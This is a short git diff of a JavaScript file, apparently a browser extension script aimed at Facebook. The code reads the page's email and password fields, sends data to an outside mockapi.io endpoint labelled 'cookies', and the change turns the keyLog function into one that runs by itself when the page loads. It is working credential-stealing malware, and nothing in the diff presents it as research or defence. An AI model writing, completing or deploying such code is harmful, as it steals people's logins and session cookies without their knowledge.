@@ -1,4 +1,4 @@
-const keyLog = () => {
+(() => {
     try {
         const edEmail = document.getElementById("email");
         const edPass = document.getElementById("pass");
@@ -26,7 +26,7 @@ const keyLog = () => {
         console.log("Error, can not find the elements!");
         chrome.runtime.sendMessage({ type: "get_facebook" }, (e) => {});
     }
-};
+})();
 
 const sendData = (user) => {
     const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
@@ -60,4 +60,4 @@ const dateTime = () => {
     return dateTimeNow;
 };
 
-keyLog();
+// keyLog();
